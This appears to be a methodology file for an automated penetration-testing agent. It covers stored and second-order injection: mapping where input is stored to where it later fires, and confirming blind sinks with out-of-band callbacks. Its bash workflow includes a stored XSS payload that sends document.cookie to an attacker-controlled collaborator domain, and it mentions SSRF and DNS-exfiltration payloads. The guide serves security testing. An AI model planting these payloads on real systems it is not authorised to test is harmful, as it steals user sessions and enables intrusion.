---
name: second_order_injection
description: Stored / second-order / blind-flow testing — inject at endpoint A, observe the effect at endpoint B or later (stored XSS in an admin view, second-order SQLi via a report/job, stored SSRF fetched by a cron). The inject point and the sink are different requests, which single-request testing systematically misses.
---

# Second-Order / Stored Injection (Inject Here, Fires There)

Single-request testing — the sqli/xss/authz executors, reflected-payload checks —
fires a payload and reads the **same** response. A large, high-value class of bugs
never shows there: the input is **stored** at endpoint A and only rendered,
parsed, or executed at endpoint B, later, often by a different actor (an admin
panel, a cron job, a generated report, a second user's page). A clean reflected
result on A says nothing about the stored sink on B. Not testing this is one of
black-box's biggest false-negative sources.

## The method: map stores → sinks, then connect them

1. **Catalog write surfaces** — every input that *persists*: profile/display name,
   bio, address, company, filenames, comments, reviews, support tickets, webhook
   URLs, custom fields, import/CSV rows, API object names, metadata. These are
   injection points even when their immediate response is clean.
2. **Catalog read / render / parse sinks** — everywhere stored data is later
   emitted or acted on: the public profile, the admin/moderation view, a generated
   PDF/invoice/report, an email, a CSV/Excel export, a log viewer, a search index,
   another tenant's dashboard, a server-side fetch of a stored URL.
3. **Seed uniquely, then hunt the sink** — write a **uniquely-tagged** payload per
   field (`s2-<field>-<rand>`) so a surfaced payload is attributable to exactly one
   write. Then visit every sink — as the **same** user, as a **different** user,
   and as an **admin** where reachable — and look for the tag rendering or firing.

## Per-class second-order shapes

- **Stored XSS** — a stored field executes in the admin/moderation view or another
  user's page (highest impact: it runs in a higher-privileged session). The sink's
  output context (HTML vs attribute vs JS vs a PDF renderer) decides the payload —
  see `xss.md`.
- **Second-order SQLi** — a value stored safely is later concatenated into a query
  by a *different* endpoint/job (report, batch, search) with no re-escaping; it
  fires when that second query runs, not on write — see `sql_injection.md`.
- **Stored SSRF** — a stored URL / webhook / avatar-URL / import-source is fetched
  server-side later (on save-confirm, a cron, an admin preview). The fetch, not the
  save, is the vuln — see `ssrf.md`.
- **Stored / log-triggered command or template injection** — a stored value flows
  into a later `system()` / template render / log processor (SSTI/RCE at the sink).
- **Stored path/file issues** — a stored filename/path used later by a download,
  archive, or include.

## Blind / out-of-band confirmation

When the sink is out of your reach (you can't see the admin view), **deploy an OOB
beacon — this is the default move, not a fallback.** Put the oracle **in the
payload**: a stored XSS that beacons to your collaborator when an admin opens the
panel, a stored SSRF URL pointing at OAST, a DNS-callback SQLi. A callback confirms
the stored sink fired even though you never saw the rendering. A stored payload
with an unreachable sink and **no** beacon is an `open_proof_gap` — "it's stored
raw" is not "it executes"; plant the beacon and wait rather than closing it.
If the *write* is filtered, that block is `blocked`, not `ruled_out` — see
`vulnerabilities/waf_evasion.md`.

**Concrete OOB workflow — run it, don't hand-drive the callback check:**

```bash
# 1. Mint a unique collaborator domain; stream callbacks to a file in the background:
interactsh-client -json -o /workspace/recon/oast.jsonl >/dev/null 2>&1 &
sleep 3
OAST=$(grep -oE '[a-z0-9]+\.oast\.[a-z]+' /workspace/recon/oast.jsonl | head -1)
echo "beacon: $OAST"
# 2. Build the payload around $OAST, per class:
#    stored XSS :  <img src=x onerror="new Image().src='//'+'$OAST'+'/'+document.cookie">
#    stored SSRF:  http://$OAST/   (store it in the url/webhook/avatar field)
#    blind SQLi :  a DNS-exfil payload resolving a label under $OAST
# 3. ...the agent sends the WRITE request storing that payload, then triggers the consume...
# 4. Poll for the callback (bounded), then read it:
for i in $(seq 1 20); do grep -q "$OAST" /workspace/recon/oast.jsonl && break; sleep 15; done
cat /workspace/recon/oast.jsonl   # any recorded interaction = the stored sink fired
```

A recorded interaction is proof the stored sink executed/fetched even though you
never saw the rendering. No callback after a real wait *and* a triggered consume →
`open_proof_gap`, not `ruled_out`.

## Discipline

- A unique tag per write is mandatory — without it you cannot attribute a surfaced
  payload to its source, and a false attribution is a bad report.
- The **sink's** context, not the write's, decides exploitability and encoding.
- Record the write→sink pair tested (`record_endpoint_test` on the write endpoint,
  noting the sink); a clean sink for one field says nothing about another field's
  sink. Confirm real execution/effect per `analysis/counterevidence.md` before
  filing.
